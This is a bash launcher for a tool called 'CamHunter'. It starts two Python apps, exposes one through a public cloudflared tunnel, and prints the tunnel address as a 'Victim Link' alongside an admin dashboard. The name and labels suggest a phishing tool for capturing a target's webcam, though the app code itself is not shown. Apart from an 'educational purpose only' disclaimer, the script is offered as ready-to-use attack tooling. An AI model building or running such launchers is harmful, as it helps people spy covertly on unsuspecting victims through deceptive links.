#!/bin/bash

# Banner and Disclaimer
clear
echo -e "\e[1;31m"
echo "╔══════════════════════════════════════════════════╗"
echo "║             🚨 CamHunter is Running 🚨           ║"
echo "║    Author not responsible for any misuse. ⚠️     ║"
echo "║      For educational purpose only. 📚            ║"
echo "╚══════════════════════════════════════════════════╝"
echo -e "\e[0m"

# Trap Ctrl+C or terminal close
cleanup() {
    echo -e "\n\n\e[1;31m[!] Interrupted. Shutting down...\e[0m"
    pkill -f "python3 app.py"
    pkill -f "python3 admin_app.py"
    pkill -f "cloudflared"
    exit 0
}
trap cleanup SIGINT SIGTERM

# Start apps
echo -e "\e[1;36m🚀 Starting app.py on port 5000...\e[0m"
python3 app.py &>/dev/null &

echo -e "\e[1;34m🚀 Starting admin_app.py on port 5001...\e[0m"
python3 admin_app.py &>/dev/null &

# Start cloudflared
cloudflared tunnel --url http://localhost:5000 > .cloudlog 2>&1 &
sleep 3

# Extract victim link
until grep -q "https://.*trycloudflare.com" .cloudlog; do
    sleep 1
done
victim_url=$(grep -o "https://[-a-zA-Z0-9.]*trycloudflare.com" .cloudlog | head -n1)

# Show only 3 links
echo -e "\n\e[1;33m[📡 Victim Link] ➜ $victim_url\e[0m"
echo -e "\e[1;36m[🌐 Localhost Link (5000)] ➜ http://localhost:5000\e[0m"
echo -e "\e[1;34m[🔒 Admin Dashboard (5001)] ➜ http://localhost:5001\e[0m"

echo -e "\n\e[1;31m[!] If you close terminal or press Ctrl+C, app will stop.\e[0m"

# Keep alive
while true; do sleep 1; done
